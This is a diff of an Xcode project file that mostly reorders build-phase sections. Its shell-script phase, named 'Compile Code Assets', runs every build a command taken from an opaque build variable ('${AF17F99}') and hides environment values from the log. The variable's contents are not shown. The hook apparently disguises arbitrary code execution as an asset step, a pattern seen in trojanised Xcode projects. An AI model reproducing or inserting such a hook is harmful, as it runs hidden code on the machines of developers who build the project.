@@ -105,17 +105,21 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-						/* End PBXBuildRule section */
-
-/* Begin PBXBuildFile section */
-/* End PBXBuildFile section */
+/* Begin PBXResourcesBuildPhase section */
+		BDCB86412F8209C70055FED3 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
 		4D4BF7D14B3347F8A699F71F /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -127,21 +131,12 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
+			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
-
-/* Begin PBXResourcesBuildPhase section */
-		BDCB86412F8209C70055FED3 /* Resources */ = {
-			isa = PBXResourcesBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-		};
-/* End PBXResourcesBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		BDCB863F2F8209C70055FED3 /* Sources */ = {
